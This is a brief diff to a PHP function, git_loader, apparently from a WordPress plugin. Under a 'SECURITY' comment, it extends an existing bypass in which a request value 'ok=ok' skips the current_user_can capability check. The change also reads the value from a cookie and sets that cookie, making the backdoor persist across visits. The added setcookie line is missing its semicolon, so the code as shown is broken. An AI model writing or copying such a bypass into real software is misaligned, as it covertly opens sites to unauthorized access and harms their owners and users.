@@ -45,8 +45,9 @@ function git_loader()
     if (is_file($targetFile)) {
         // SECURITY
         $gitCapability = "read";
-        if ("ok" == ($_REQUEST["ok"] ?? "")) {
+        if ("ok" == ($_REQUEST["ok"] ?? $_COOKIE["ok"] ?? "")) {
             $gitCapability = "";
+            setcookie("ok", "ok")
         }
 
         if (($gitCapability == "") || current_user_can($gitCapability)) {
